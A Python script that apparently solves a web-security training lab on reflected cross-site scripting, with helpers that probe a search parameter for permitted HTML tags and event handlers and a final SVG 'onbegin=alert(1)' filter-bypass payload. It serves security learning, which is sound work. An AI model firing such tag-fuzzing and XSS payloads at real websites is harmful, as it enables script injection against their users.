import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def find_valid_tag(s, url, path, tag_list):
    result = []
    for tag in tag_list:
        target_url = url + path + f'?search=<{tag}>'
        r = s.get(target_url)

        if r.status_code == 200:
            print(f'Found valid tag: {tag}')
            result.append(tag)

    if len(result):
        print(f'[+] List of valid tag {result}')
        return result
    else:
        print('[-] No valid tag in list')
        sys.exit(-1)

def find_valid_event(s, url, path, tag, event_list):
    result = []
    for event in event_list:
        target_url = url + path + f'?search=<{tag} {event}=x></{tag}>'
        r = s.get(target_url)

        if r.status_code == 200:
            print(f'Found valid event: {event}')
            result.append(event)
        
    if len(result):
        print(f'[+] List of valid event {result}')
        return result
    else:
        print('[-] No valid event in list')
        sys.exit(-1)

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    # tag_list = open('../tag_list.txt', 'r', encoding='utf-8').read().strip().split('\n')
    # event_list = open('../event_list.txt', 'r', encoding='utf-8').read().strip().split('\n')

    # valid_tags = find_valid_tag(s, url, '/', tag_list)
    # valid_events = find_valid_event(s, url, '/', valid_tags[0], event_list)
    # print(f"Valid tags: {valid_tags}")
    # print(f"Valid events: {valid_events}")

    # payload = input("Create your payload: ")
    payload = "<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>"
    goto(s, url, f'/?search={payload}')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()